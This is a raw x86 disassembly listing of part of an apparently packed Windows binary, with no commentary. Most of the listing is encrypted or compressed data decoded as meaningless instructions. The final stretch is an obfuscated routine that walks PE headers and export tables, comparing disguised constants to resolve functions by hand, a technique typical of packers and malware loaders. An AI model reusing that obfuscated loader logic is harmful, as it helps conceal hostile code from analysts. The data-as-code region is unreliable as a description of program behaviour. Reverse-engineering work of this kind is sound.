  409bb2:	fst    DWORD PTR [ecx]
  409bb4:	mov    esi,0x4dd069f9
  409bb9:	(bad)  
  409bba:	shr    BYTE PTR [ecx-0x43],1
  409bbd:	sub    DWORD PTR [esi-0x2d],0x4f480c36
  409bc4:	cmp    al,cl
  409bc6:	xlat   BYTE PTR ds:[ebx]
  409bc7:	mov    edi,DWORD PTR ds:0x4bb6486d
  409bcd:	sub    eax,0x6fe53984
  409bd2:	js     0x409c28
  409bd4:	int    0x61
  409bd6:	daa    
  409bd7:	(bad)  
  409bd8:	sar    DWORD PTR [edi],0x18
  409bdb:	and    BYTE PTR [esi+0x3f],0x90
  409bdf:	xor    dh,cl
  409be1:	or     eax,0xac4d0e35
  409be6:	jle    0x409c24
  409be8:	dec    ebp
  409be9:	pusha  
  409bea:	shr    ch,cl
  409bec:	xor    eax,0xe7772b59
  409bf1:	test   ecx,ebp
  409bf3:	in     eax,0x98
  409bf5:	cdq    
  409bf6:	fimul  DWORD PTR [eax-0x6da8a15c]
  409bfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bfd:	lods   eax,DWORD PTR ds:[esi]
  409bfe:	test   ch,0xc2
  409c01:	or     BYTE PTR [edx],ch
  409c03:	mov    ecx,0xf4ad74ca
  409c08:	fs in  eax,dx
  409c0a:	outs   dx,BYTE PTR ds:[esi]
  409c0b:	js     0x409c48
  409c0d:	add    cl,BYTE PTR [ecx]
  409c0f:	fxch   st(3)
  409c11:	retf   
  409c12:	aam    0x5
  409c14:	cdq    
  409c15:	sahf   
  409c16:	push   0xfd7ecf9b
  409c1b:	adc    eax,0x9b6331cb
  409c20:	outs   dx,DWORD PTR ds:[esi]
  409c21:	inc    eax
  409c22:	cs cwde 
  409c24:	inc    eax
  409c25:	es mov ecx,0x78fa0a84
  409c2b:	mov    ecx,0x89a7be3f
  409c30:	push   ebp
  409c31:	sbb    ah,BYTE PTR ds:0xff53586
  409c37:	mov    dh,0x6e
  409c39:	lock lods al,BYTE PTR ds:[esi]
  409c3b:	add    DWORD PTR [eax+eiz*4+0x4b],esp
  409c3f:	pop    edi
  409c40:	cmp    al,0x21
  409c42:	jg     0x409c1b
  409c44:	sar    DWORD PTR [esi],0xf8
  409c47:	fimul  WORD PTR [ebx]
  409c49:	and    BYTE PTR [eax+0x34670a8a],0x81
  409c50:	icebp  
  409c51:	adc    eax,0x503027ea
  409c56:	pop    edx
  409c57:	xor    DWORD PTR [ecx+0x2aed5f2f],esp
  409c5d:	sbb    esp,DWORD PTR [esi]
  409c5f:	xlat   BYTE PTR ds:[ebx]
  409c60:	in     al,0x33
  409c62:	mov    al,bl
  409c64:	cdq    
  409c65:	les    ecx,FWORD PTR [edx-0x48ca6f42]
  409c6b:	loopne 0x409c22
  409c6d:	xor    al,0x68
  409c6f:	daa    
  409c70:	out    dx,al
  409c71:	adc    eax,0x1da22143
  409c76:	mov    DWORD PTR [ecx-0x2331a1ba],eax
  409c7c:	in     eax,dx
  409c7d:	out    0xf6,eax
  409c7f:	and    DWORD PTR [edi],0xffffffbc
  409c82:	out    0x56,al
  409c84:	dec    esi
  409c85:	xchg   edi,eax
  409c86:	in     eax,0x7c
  409c88:	xor    DWORD PTR [edi],ecx
  409c8a:	fisttp QWORD PTR [esi+0x4b]
  409c8d:	sub    al,BYTE PTR [eax+edi*4-0x177b985e]
  409c94:	cmc    
  409c95:	retf   
  409c96:	aam    0x92
  409c98:	push   cs
  409c99:	push   edi
  409c9a:	sbb    ebp,ebp
  409c9c:	push   ss
  409c9d:	mov    BYTE PTR [esi-0x6baa3434],dh
  409ca3:	test   BYTE PTR [ecx+0x76],bh
  409ca6:	test   BYTE PTR [ebx],cl
  409ca8:	cdq    
  409ca9:	dec    ebp
  409caa:	lds    ecx,FWORD PTR [edx+0x73ce0564]
  409cb0:	sub    esi,edx
  409cb2:	lea    ecx,[edi]
  409cb4:	icebp  
  409cb5:	jecxz  0x409c39
  409cb7:	lods   al,BYTE PTR ds:[esi]
  409cb8:	shl    DWORD PTR [edi],0x25
  409cbb:	mov    edx,0xb1411336
  409cc0:	out    0xbe,eax
  409cc2:	lds    esi,FWORD PTR [edi-0x84fb760]
  409cc8:	mov    eax,0x74b699c4
  409ccd:	lea    eax,[ebx-0x43]
  409cd0:	adc    BYTE PTR [eax+0x1263ebe7],ch
  409cd6:	xor    bl,BYTE PTR [edi+0x26]
  409cd9:	cmp    BYTE PTR [ebx-0x1b4ddc2d],0xd8
  409ce0:	sahf   
  409ce1:	jns    0x409d1e
  409ce3:	and    eax,0xd2988e9c
  409ce8:	rcr    BYTE PTR [esi],0xa8
  409ceb:	adc    eax,0xbe081dde
  409cf0:	jecxz  0x409c72
  409cf2:	lock aad 0xd
  409cf5:	daa    
  409cf6:	add    eax,0xf3ea8f10
  409cfb:	lds    edi,FWORD PTR ds:0xf75bfad7
  409d01:	pop    eax
  409d02:	cmp    ebx,ecx
  409d04:	mov    edx,0xee707423
  409d09:	dec    esi
  409d0a:	push   0xc364b4f2
  409d0f:	push   es
  409d10:	cmp    bl,BYTE PTR [ebx-0x849bd4d]
  409d16:	lock jp 0x409d81
  409d19:	and    ah,cl
  409d1b:	and    al,0x3b
  409d1d:	enter  0x1e3a,0x31
  409d21:	dec    ecx
  409d22:	cmp    bh,BYTE PTR [edi-0x4f9b8411]
  409d28:	dec    edi
  409d29:	dec    ecx
  409d2a:	inc    edi
  409d2b:	xchg   edi,eax
  409d2c:	xchg   esp,eax
  409d2d:	nop
  409d2e:	adc    al,0x2
  409d30:	es adc eax,0x5f13f6fe
  409d36:	ss pop edi
  409d38:	cmc    
  409d39:	fwait
  409d3a:	sar    BYTE PTR [edx+0x38],0x80
  409d3e:	mov    ch,bh
  409d40:	pop    ebp
  409d41:	xor    al,al
  409d43:	xchg   ebx,eax
  409d44:	fnstcw WORD PTR [esi+ebx*1+0x682330f9]
  409d4b:	test   eax,0x2bdd1b5a
  409d50:	repz or ah,BYTE PTR [edx]
  409d53:	neg    BYTE PTR [edx+0x56e1d38d]
  409d59:	add    al,0x5f
  409d5b:	shr    BYTE PTR [edx+eax*4],cl
  409d5e:	xchg   DWORD PTR [esi-0x7b4599c6],ebp
  409d64:	pop    esp
  409d65:	popa   
  409d66:	or     ah,dh
  409d68:	cmp    BYTE PTR [edi],0x3d
  409d6b:	(bad)  
  409d6d:	in     eax,dx
  409d6e:	push   eax
  409d6f:	push   ss
  409d70:	cmp    ah,BYTE PTR [eax-0x30f4f783]
  409d76:	jecxz  0x409d99
  409d78:	add    edi,DWORD PTR [ebp-0x53d8876d]
  409d7e:	jno    0x409d04
  409d80:	pop    ebp
  409d81:	fs push esp
  409d83:	pop    es
  409d84:	jb     0x409dff
  409d86:	daa    
  409d87:	hlt    
  409d88:	cdq    
  409d89:	sub    ebx,ebp
  409d8b:	dec    esi
  409d8c:	test   cl,bl
  409d8e:	inc    ebx
  409d8f:	call   0x25e9:0x4bdc1da9
  409d96:	fisubr DWORD PTR [eax]
  409d98:	push   ecx
  409d99:	sbb    BYTE PTR [ecx-0x47277e36],dh
  409d9f:	aas    
  409da0:	cmp    DWORD PTR ss:[ebx-0x55],ebp
  409da4:	scas   eax,DWORD PTR es:[edi]
  409da5:	popf   
  409da6:	jno    0x409e0a
  409da8:	xor    dl,BYTE PTR [eax-0x43]
  409dab:	pop    edi
  409dac:	out    dx,al
  409dad:	lods   al,BYTE PTR ds:[esi]
  409dae:	outs   dx,DWORD PTR ds:[esi]
  409daf:	sub    DWORD PTR [eax-0x63a00fc5],esp
  409db5:	loop   0x409d86
  409db7:	push   ecx
  409db8:	xchg   ebx,eax
  409db9:	and    eax,0x94b7e446
  409dbe:	in     al,dx
  409dbf:	repz loope 0x409da9
  409dc2:	mov    ecx,0xe653f4fe
  409dc7:	enter  0x5624,0x75
  409dcb:	scas   al,BYTE PTR es:[edi]
  409dcc:	mov    ds:0xc29e9896,eax
  409dd1:	pop    edx
  409dd2:	add    al,0x9f
  409dd4:	stc    
  409dd5:	(bad)  
  409dd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dd7:	sbb    al,dh
  409dd9:	popa   
  409dda:	push   ebx
  409ddb:	jle    0x409df7
  409ddd:	shl    BYTE PTR [edx+0x750c45d9],0x7d
  409de4:	hlt    
  409de5:	xchg   BYTE PTR [edi+0x67f97a8e],bl
  409deb:	or     eax,0x53d0446d
  409df0:	lock das 
  409df2:	rol    BYTE PTR [edi+0x4d08cd18],0xa7
  409df9:	daa    
  409dfa:	ret    
  409dfb:	jl     0x409dea
  409dfd:	cmp    eax,0xe2b133ab
  409e02:	adc    bl,ch
  409e04:	test   al,0xd4
  409e06:	cs jmp 0x409e3b
  409e09:	adc    eax,0xabaf3e3e
  409e0e:	and    eax,0xf2209b40
  409e13:	dec    esi
  409e14:	mov    cl,BYTE PTR [eax]
  409e16:	loopne 0x409de2
  409e18:	mov    ebp,0x17f53348
  409e1d:	outs   dx,BYTE PTR ds:[esi]
  409e1e:	jbe    0x409e3d
  409e20:	and    bl,0x5f
  409e23:	sub    DWORD PTR [eax-0x70],ebp
  409e26:	sahf   
  409e27:	and    edi,DWORD PTR [edx]
  409e29:	adc    eax,0xd860f745
  409e2e:	test   al,0x2b
  409e30:	xchg   edx,eax
  409e31:	push   ss
  409e32:	mov    ?,ebp
  409e34:	imul   ebp,ebp,0xffffff8e
  409e37:	and    DWORD PTR ds:0x5c85e52a,0x965334a1
  409e41:	sahf   
  409e42:	xor    eax,0x65bffa37
  409e47:	inc    edi
  409e48:	jle    0x409ec0
  409e4a:	call   0x53da6930
  409e4f:	mov    bh,0xbc
  409e51:	(bad)  
  409e52:	fsubr  st(7),st
  409e54:	fs push es
  409e56:	mov    ebx,0x114d00d6
  409e5b:	into   
  409e5c:	inc    DWORD PTR [ecx+0x31]
  409e5f:	repnz arpl WORD PTR [esi-0x42],dx
  409e63:	xor    ah,BYTE PTR [eax+0x3f]
  409e66:	pop    es
  409e67:	push   ebp
  409e68:	pop    edi
  409e69:	dec    edx
  409e6a:	jno    0x409e02
  409e6c:	lods   al,BYTE PTR ds:[esi]
  409e6d:	add    eax,0x32268c2d
  409e72:	ss into 
  409e74:	imul   BYTE PTR [ecx+esi*8+0x6fce3dce]
  409e7b:	in     al,0x6d
  409e7d:	pop    eax
  409e7e:	or     eax,0xbfff177d
  409e83:	inc    edi
  409e84:	pushf  
  409e85:	pop    eax
  409e86:	dec    ebp
  409e87:	loopne 0x409eac
  409e89:	aad    0x20
  409e8b:	add    ch,BYTE PTR [edx-0x62]
  409e8e:	icebp  
  409e8f:	sub    eax,0x35ec903d
  409e94:	mov    eax,ds:0x86f2d70e
  409e99:	cwde   
  409e9a:	xchg   esp,eax
  409e9b:	int3   
  409e9c:	(bad)  
  409e9d:	pop    ebp
  409e9e:	jmp    0x3724e343
  409ea3:	rcl    BYTE PTR [edi+0x7d8846ce],cl
  409ea9:	dec    ebp
  409eaa:	sbb    al,0x1
  409eac:	mov    ds:0x3aea22b5,eax
  409eb1:	loope  0x409f0d
  409eb3:	mov    edx,DWORD PTR [ebx-0x78]
  409eb6:	clc    
  409eb7:	call   0xa02a8158
  409ebc:	push   ss
  409ebd:	out    0x1c,al
  409ebf:	(bad)  [edx]
  409ec1:	cmp    cl,bl
  409ec3:	sbb    al,0x7b
  409ec5:	retf   
  409ec6:	aad    0x32
  409ec8:	lods   al,BYTE PTR ds:[esi]
  409ec9:	clc    
  409eca:	jge    0x409e8d
  409ecc:	mov    esp,0xf81f0f9
  409ed1:	test   al,0xdc
  409ed3:	add    BYTE PTR [ebp-0x7f109345],bl
  409ed9:	out    0x8c,eax
  409edb:	(bad)  
  409edd:	repnz xchg esi,eax
  409edf:	out    0xd9,eax
  409ee1:	cmp    edi,DWORD PTR [eax+0x1f2e854f]
  409ee7:	inc    ebp
  409ee8:	shl    BYTE PTR [bx+di],0x6
  409eec:	cli    
  409eed:	frstor [eax+0x257dd84]
  409ef3:	xchg   edi,eax
  409ef4:	(bad)  
  409ef5:	sbb    bh,BYTE PTR [esi-0x41a52cf9]
  409efb:	jmp    0x7f085067
  409f00:	xor    al,0xbb
  409f02:	jno    0x409efe
  409f04:	dec    edi
  409f05:	loop   0x409e99
  409f07:	ror    BYTE PTR [edi+0x76],1
  409f0a:	out    0x85,eax
  409f0c:	fist   WORD PTR [esi]
  409f0e:	pop    esi
  409f0f:	fwait
  409f10:	test   bh,ch
  409f12:	int3   
  409f13:	push   ds
  409f14:	dec    ecx
  409f15:	adc    al,0xa9
  409f17:	jmp    0x409f49
  409f19:	add    ah,BYTE PTR [esp+eiz*4+0x2d2dc8]
  409f20:	mov    dh,0x1f
  409f22:	std    
  409f23:	push   edx
  409f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f25:	jae    0x409ef3
  409f27:	(bad)  
  409f28:	sbb    bl,BYTE PTR [ebp+eiz*1+0x26]
  409f2c:	shr    BYTE PTR [ecx+0x63b1f629],0x3
  409f33:	ss cmc 
  409f35:	sbb    esp,DWORD PTR [ebx-0x64]
  409f38:	cmp    DWORD PTR [ecx+ecx*1+0x78e4637e],edi
  409f3f:	and    ah,ah
  409f41:	and    eax,0x73f226cf
  409f46:	inc    ebx
  409f47:	stc    
  409f48:	sub    dh,BYTE PTR ds:0xafe0e6de
  409f4e:	or     DWORD PTR [ebp-0x2f],edx
  409f51:	or     DWORD PTR [esi-0x59],ebx
  409f54:	iret   
  409f55:	inc    edi
  409f56:	push   0xd
  409f58:	lods   al,BYTE PTR ds:[esi]
  409f59:	push   ds
  409f5a:	mov    ebx,DWORD PTR [ebx+0x1c]
  409f5d:	or     ah,ah
  409f5f:	fs push ss
  409f61:	inc    ebp
  409f62:	push   esi
  409f63:	push   0x6c6d749c
  409f68:	jmp    0x8400:0xb7f4bda3
  409f6f:	mov    ebx,0x47075e7a
  409f74:	mov    al,ds:0xd1c20bf3
  409f79:	(bad)  
  409f7a:	cmp    eax,0xd0d33a2a
  409f7f:	repnz clc 
  409f81:	inc    ecx
  409f82:	or     eax,eax
  409f84:	or     al,0x13
  409f86:	xor    al,0xdf
  409f88:	aas    
  409f89:	pop    es
  409f8a:	mov    ds:0x6155ca6f,al
  409f8f:	iret   
  409f90:	cmp    BYTE PTR [esp+eax*2],ch
  409f93:	clc    
  409f94:	mov    DWORD PTR [edx],edx
  409f96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f97:	std    
  409f98:	push   eax
  409f99:	mov    ch,0x3
  409f9b:	mov    edx,0xa7eded78
  409fa0:	mov    esp,0xbfe9abee
  409fa5:	mov    esp,0x4420f331
  409faa:	cmp    al,0x80
  409fac:	imul   edx,DWORD PTR [esi-0x35],0x9319cb68
  409fb3:	pop    edx
  409fb4:	inc    ebp
  409fb5:	out    dx,eax
  409fb6:	pop    es
  409fb7:	sahf   
  409fb8:	jne    0x409ffe
  409fba:	rol    BYTE PTR [eax+ecx*8+0x58],cl
  409fbe:	sub    eax,0x8ec54629
  409fc3:	push   edi
  409fc4:	btc    DWORD PTR [eax-0x3d8f1545],esp
  409fcb:	or     BYTE PTR ds:0x7725aa3e,0x5b
  409fd2:	xor    esp,esp
  409fd4:	inc    ebp
  409fd5:	aas    
  409fd6:	icebp  
  409fd7:	repz loop 0x409fe3
  409fda:	mov    edi,0x67747f01
  409fdf:	pusha  
  409fe0:	lods   al,BYTE PTR ds:[esi]
  409fe1:	jne    0x409fa0
  409fe3:	popf   
  409fe4:	(bad)  
  409fe5:	iret   
  409fe6:	jl     0x40a02b
  409fe8:	cmp    al,BYTE PTR [ecx+ebp*8+0x5c656d37]
  409fef:	je     0x40a03b
  409ff1:	hlt    
  409ff2:	stos   BYTE PTR es:[edi],al
  409ff3:	sbb    DWORD PTR [esi],ebp
  409ff5:	push   eax
  409ff6:	jl     0x409f8c
  409ff8:	mov    ds:0x9cf64bdb,eax
  409ffd:	gs fcmovnu st,st(1)
  40a000:	or     ah,dh
  40a002:	(bad)
  40a005:	aas    
  40a006:	test   DWORD PTR [edx+0x3bf00c97],esi
  40a00c:	imul   eax,DWORD PTR [esp+ecx*1-0x2a],0xffffffeb
  40a011:	fwait
  40a012:	mov    al,ds:0x5d9acd83
  40a017:	adc    edi,DWORD PTR [esi+ebx*4-0x2d]
  40a01b:	sahf   
  40a01c:	fadd   st(6),st
  40a01e:	adc    BYTE PTR [esi+0x138e7aee],0xbe
  40a025:	cdq    
  40a026:	cdq    
  40a027:	out    0x66,al
  40a029:	or     eax,0xc727ffa3
  40a02e:	out    dx,eax
  40a02f:	ins    DWORD PTR es:[edi],dx
  40a030:	icebp  
  40a031:	and    bh,BYTE PTR [edx-0x16]
  40a034:	in     al,dx
  40a035:	faddp  st(7),st
  40a037:	sub    eax,0x3e005fb8
  40a03c:	sbb    DWORD PTR [ebx-0x5bc21b77],edx
  40a042:	or     esi,ebx
  40a044:	sub    al,0x8
  40a046:	outs   dx,DWORD PTR ds:[esi]
  40a047:	mov    ah,0xb1
  40a049:	es xchg ecx,eax
  40a04b:	into   
  40a04c:	push   ds
  40a04d:	fimul  WORD PTR [esi-0xd]
  40a050:	pop    eax
  40a051:	inc    eax
  40a052:	xor    eax,edi
  40a054:	in     eax,dx
  40a055:	dec    ebx
  40a056:	xchg   edx,eax
  40a057:	call   DWORD PTR [ebx-0x6a332208]
  40a05d:	pop    es
  40a05e:	leave  
  40a05f:	mov    al,ds:0x48e2a395
  40a064:	xchg   sp,ax
  40a066:	aam    0xad
  40a068:	lock idiv ah
  40a06b:	mov    esp,eax
  40a06d:	popf   
  40a06e:	adc    eax,0x3f20dfc7
  40a073:	cmp    BYTE PTR [edx-0x35],0x5c
  40a077:	iret   
  40a078:	jmp    0x7728:0x679a2161
  40a07f:	cs nop
  40a081:	mov    esp,0x7cc7794e
  40a086:	fwait
  40a087:	cmp    cl,ch
  40a089:	dec    esp
  40a08a:	(bad)  
  40a08c:	mov    ecx,0xbfd8841e
  40a091:	sbb    DWORD PTR [edx-0xd],0xc
  40a095:	aas    
  40a096:	ss addr16 xchg esp,eax
  40a099:	js     0x40a0f5
  40a09b:	mov    esi,esi
  40a09d:	or     DWORD PTR [eax],ecx
  40a09f:	mov    bh,0x7c
  40a0a1:	out    dx,al
  40a0a2:	sub    al,BYTE PTR [ebp+0x111dcafe]
  40a0a8:	jecxz  0x40a105
  40a0aa:	jl     0x40a0ec
  40a0ac:	(bad)  
  40a0ad:	repz xor ecx,DWORD PTR [ebp-0x161d9138]
  40a0b4:	lods   eax,DWORD PTR ds:[esi]
  40a0b5:	outs   dx,BYTE PTR ds:[esi]
  40a0b6:	addr16 dec esp
  40a0b8:	mov    al,0x69
  40a0ba:	enter  0x4577,0x4e
  40a0be:	sub    ch,cl
  40a0c0:	stos   BYTE PTR es:[edi],al
  40a0c1:	cmp    DWORD PTR [eax+0x45f5a5dc],ebx
  40a0c7:	fnsave [eax+0xc]
  40a0ca:	fadd   QWORD PTR [esi+edx*4-0x52d4bdac]
  40a0d1:	or     bl,0x5f
  40a0d4:	jb     0x40a0a5
  40a0d6:	push   esp
  40a0d7:	cmp    eax,0x2e631440
  40a0dc:	mov    dl,0x9b
  40a0de:	jg     0x40a0c9
  40a0e0:	mov    edx,0xd0c4d0e8
  40a0e5:	pop    ebx
  40a0e6:	mov    edx,0xf65129bf
  40a0eb:	cdq    
  40a0ec:	icebp  
  40a0ed:	mov    edi,0xe9da8cd6
  40a0f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0f3:	mov    bl,0xb3
  40a0f5:	scas   al,BYTE PTR es:[edi]
  40a0f6:	test   BYTE PTR [edx+ebp*2+0x30f7b629],bl
  40a0fd:	push   ss
  40a0fe:	and    DWORD PTR [ecx+edx*8+0x2e],edx
  40a102:	add    cl,0xd4
  40a105:	dec    dl
  40a107:	aam    0x8
  40a109:	mov    ebp,0xa473c235
  40a10e:	sbb    al,0x32
  40a110:	dec    ebp
  40a111:	fldcw  WORD PTR [esi+0x2fa2b655]
  40a117:	and    al,0xbf
  40a119:	inc    ebx
  40a11a:	loopne 0x40a0f7
  40a11c:	(bad)  
  40a11d:	sti    
  40a11e:	and    ebx,DWORD PTR [ebx+0x278887da]
  40a124:	addr16 mov esp,0x2a859c67
  40a12a:	(bad)  
  40a12b:	pop    eax
  40a12c:	cld    
  40a12d:	mov    ds,WORD PTR ss:[ebp+0xa]
  40a131:	or     eax,0x79
  40a134:	mov    al,ds:0x106e5660
  40a139:	ror    BYTE PTR [ecx+0x121e6e64],cl
  40a13f:	dec    eax
  40a140:	int3   
  40a141:	sahf   
  40a142:	and    DWORD PTR [ecx+ecx*2],edi
  40a145:	mov    edi,0x866e4006
  40a14a:	push   cs
  40a14b:	dec    ecx
  40a14c:	popa   
  40a14d:	fisubr WORD PTR [ecx-0x21c314be]
  40a153:	outs   dx,BYTE PTR ds:[esi]
  40a154:	aam    0xd8
  40a156:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a157:	cs jnp 0x40a130
  40a15a:	sbb    DWORD PTR [ebp+0x662f5f14],esp
  40a160:	or     ebp,edx
  40a162:	mov    dh,0x6a
  40a164:	mov    gs,ebp
  40a166:	and    edi,ebx
  40a168:	pop    esp
  40a169:	outs   dx,DWORD PTR ds:[esi]
  40a16a:	and    edx,eax
  40a16c:	xchg   ecx,eax
  40a16d:	inc    ebx
  40a16e:	fdivr  DWORD PTR [esi]
  40a170:	sti    
  40a171:	push   edx
  40a172:	pop    esp
  40a173:	add    al,BYTE PTR [edi-0x1790c9b0]
  40a179:	cli    
  40a17a:	add    cl,bh
  40a17c:	aam    0x85
  40a17e:	sub    ch,BYTE PTR [ebx+0x1b605ddc]
  40a184:	inc    ecx
  40a185:	retf   0xad49
  40a188:	inc    esi
  40a189:	jnp    0x40a11d
  40a18b:	lods   al,BYTE PTR ds:[esi]
  40a18c:	mov    eax,0x15f19ba9
  40a191:	int    0x36
  40a193:	jno    0x40a149
  40a195:	or     eax,ebp
  40a197:	mov    ch,0xc5
  40a199:	adc    eax,0xe3816df2
  40a19e:	cmp    BYTE PTR [ebp+eiz*8+0x6bcf87e9],dl
  40a1a5:	push   ebp
  40a1a6:	xchg   edi,eax
  40a1a7:	out    0x3c,eax
  40a1a9:	mov    bl,0xeb
  40a1ab:	pop    esp
  40a1ac:	outs   dx,BYTE PTR ds:[esi]
  40a1ad:	pop    es
  40a1ae:	and    esp,ebp
  40a1b0:	push   eax
  40a1b1:	shl    DWORD PTR [ebx+0x52],1
  40a1b4:	data16 or dl,BYTE PTR [ecx-0x4fba02cb]
  40a1bb:	xchg   edi,eax
  40a1bc:	stc    
  40a1bd:	inc    ecx
  40a1be:	nop
  40a1bf:	dec    ebp
  40a1c0:	fs (bad) 
  40a1c2:	mov    ebp,0xd4f0c6f
  40a1c7:	cmc    
  40a1c8:	jmp    0xe32c:0x6c1a5adb
  40a1cf:	add    DWORD PTR [esi],0x24ce9e05
  40a1d5:	or     BYTE PTR [ecx-0x9cba47d],dh
  40a1db:	test   al,0x2a
  40a1dd:	es rdtsc 
  40a1e0:	int3   
  40a1e1:	aaa    
  40a1e2:	aam    0x55
  40a1e4:	cli    
  40a1e5:	ins    DWORD PTR es:[edi],dx
  40a1e6:	in     eax,dx
  40a1e7:	test   DWORD PTR [esi-0x2b],ebx
  40a1ea:	push   esp
  40a1eb:	(bad)  [edi-0x3]
  40a1ee:	(bad)  
  40a1ef:	jae    0x40a22f
  40a1f1:	jmp    0xc77bf9d1
  40a1f6:	cmp    ebp,ecx
  40a1f8:	sub    al,0xbe
  40a1fa:	mov    bh,0xab
  40a1fc:	sbb    eax,DWORD PTR ds:0xee034ae
  40a202:	lds    ecx,FWORD PTR [ebx-0x24]
  40a205:	cmp    eax,0x17a2fa3d
  40a20a:	push   ecx
  40a20b:	dec    ebx
  40a20c:	or     esi,edx
  40a20e:	sbb    dl,BYTE PTR [ebx+0x4d]
  40a211:	stos   BYTE PTR es:[edi],al
  40a212:	mov    ?,esi
  40a214:	outs   dx,BYTE PTR ds:[esi]
  40a215:	jmp    0xb6ea7ea8
  40a21a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a21b:	cmp    bl,BYTE PTR [ecx-0x5ce83063]
  40a221:	mov    ch,0x3c
  40a223:	mov    esp,0x26342c6
  40a228:	mov    eax,0xba726b62
  40a22d:	or     bl,ch
  40a22f:	or     ch,BYTE PTR [esi+0x70]
  40a232:	cmp    BYTE PTR [ecx],bl
  40a234:	test   al,0x80
  40a236:	(bad)  
  40a237:	sub    eax,0xd4cf2465
  40a23c:	cmp    dh,bh
  40a23e:	sub    ah,BYTE PTR [esi+0x39]
  40a241:	xchg   edx,eax
  40a242:	jle    0x40a234
  40a244:	xchg   edx,eax
  40a245:	das    
  40a246:	ret    0x3a3c
  40a249:	pop    ebx
  40a24a:	xor    cl,BYTE PTR [ebx+ecx*4]
  40a24d:	repz mov dh,0xeb
  40a250:	dec    edx
  40a251:	pop    esp
  40a252:	sub    al,0xad
  40a254:	dec    DWORD PTR ds:0x848dbe59
  40a25b:	cmp    ah,al
  40a25d:	in     eax,0x64
  40a25f:	add    BYTE PTR [ebx-0x6ccf383],cl
  40a265:	add    edi,edx
  40a267:	imul   eax,edi
  40a26a:	mov    edi,DWORD PTR [ebp+0xc]
  40a26d:	xor    edi,ecx
  40a26f:	sub    edi,eax
  40a271:	mov    eax,DWORD PTR [ebp-0x4]
  40a274:	add    edi,edx
  40a276:	cmp    DWORD PTR [eax],edi
  40a278:	mov    eax,DWORD PTR [ebp-0x4]
  40a27b:	mov    edi,DWORD PTR [ebp+0x10]
  40a27e:	jg     0x40a291
  40a284:	xor    edi,ecx
  40a286:	mov    ebx,esi
  40a288:	sub    ebx,edi
  40a28a:	add    DWORD PTR [eax],ebx
  40a28c:	jmp    0x40a297
  40a291:	xor    edi,ecx
  40a293:	add    edi,edx
  40a295:	add    DWORD PTR [eax],edi
  40a297:	mov    eax,DWORD PTR [ebp-0x8]
  40a29a:	mov    edi,DWORD PTR [ebp-0x10]
  40a29d:	mov    eax,DWORD PTR [eax]
  40a29f:	xor    edi,ecx
  40a2a1:	add    edi,0x3272e1
  40a2a7:	not    edi
  40a2a9:	and    eax,edi
  40a2ab:	movsx  di,BYTE PTR [eax+0x1]
  40a2b0:	mov    ebx,0x3b51
  40a2b5:	sub    di,bx
  40a2b8:	mov    ebx,0x8a8d
  40a2bd:	xor    di,bx
  40a2c0:	mov    ebx,0x4f84
  40a2c5:	cmp    di,bx
  40a2c8:	jne    0x40a2f0
  40a2ce:	movsx  di,BYTE PTR [eax]
  40a2d2:	mov    ebx,0x3b51
  40a2d7:	sub    di,bx
  40a2da:	mov    ebx,0x8a8d
  40a2df:	xor    di,bx
  40a2e2:	mov    ebx,0x4e71
  40a2e7:	cmp    di,bx
  40a2ea:	je     0x40a300
  40a2f0:	mov    edi,DWORD PTR [ebp-0x10]
  40a2f3:	xor    edi,ecx
  40a2f5:	mov    ebx,esi
  40a2f7:	sub    ebx,edi
  40a2f9:	add    eax,ebx
  40a2fb:	jmp    0x40a2ab
  40a300:	mov    esi,DWORD PTR [ebp-0x14]
  40a303:	mov    esi,DWORD PTR [esi]
  40a305:	mov    edi,DWORD PTR [eax+0x3c]
  40a308:	lea    esi,[edi+esi*8+0x78]
  40a30c:	mov    esi,DWORD PTR [esi+eax*1]
  40a30f:	mov    DWORD PTR [ebp-0x8],esi
  40a312:	mov    esi,DWORD PTR [ebp+0x8]
  40a315:	xor    esi,ecx
  40a317:	add    esi,edx
  40a319:	mov    DWORD PTR [ebp-0x14],esi
  40a31c:	mov    esi,DWORD PTR [ebp+0x8]
  40a31f:	mov    edi,DWORD PTR [ebp-0x8]
  40a322:	xor    esi,ecx
  40a324:	add    esi,edx
  40a326:	pop    ebx
  40a327:	cmp    edi,esi
  40a329:	jne    0x40a347
  40a32f:	mov    eax,DWORD PTR [ebp+0xc]
  40a332:	xor    eax,ecx
  40a334:	mov    ecx,DWORD PTR [ebp-0x8]
  40a337:	add    eax,edx
  40a339:	imul   eax,ecx
  40a33c:	mov    DWORD PTR [ebp-0x8],eax
  40a33f:	push   DWORD PTR [ebp+0x18]
  40a342:	jmp    0x40a39b
  40a347:	mov    ecx,DWORD PTR [ebp-0x8]
  40a34a:	add    ecx,eax
  40a34c:	mov    DWORD PTR [ebp-0x14],ecx
  40a34f:	mov    ecx,DWORD PTR [ebp-0x14]
  40a352:	mov    ecx,DWORD PTR [ecx+0xc]
  40a355:	movsx  cx,BYTE PTR [ecx+eax*1]
  40a35a:	mov    edx,0x3b51
  40a35f:	sub    cx,dx
  40a362:	mov    edx,0x8a8d
  40a367:	xor    cx,dx
  40a36a:	mov    edx,0x4e77
  40a36f:	cmp    cx,dx
  40a372:	jne    0x40a33f
  40a378:	mov    ecx,DWORD PTR ds:0x43a2d4
  40a37e:	mov    ecx,DWORD PTR [ecx+0x198]
  40a384:	mov    DWORD PTR [ecx],eax
  40a386:	jmp    0x40a3ac
  40a38b:	mov    ecx,DWORD PTR [ebp+0x18]
  40a38e:	cmp    ecx,0xf89c8584
  40a394:	jne    0x40a3ac
  40a39a:	push   eax
  40a39b:	push   DWORD PTR [ebp+0x14]
  40a39e:	push   DWORD PTR [ebp+0x10]
  40a3a1:	push   DWORD PTR [ebp+0xc]
  40a3a4:	push   DWORD PTR [ebp+0x8]
  40a3a7:	call   0x407a51
  40a3ac:	pop    edi
  40a3ad:	pop    esi
  40a3ae:	leave  
  40a3af:	ret    0x14
  40a3b2:	push   ebp
  40a3b3:	mov    ebp,esp
  40a3b5:	sub    esp,0xc
  40a3b8:	sbb    DWORD PTR ds:0x43701c,0x4790
  40a3c2:	push   esi
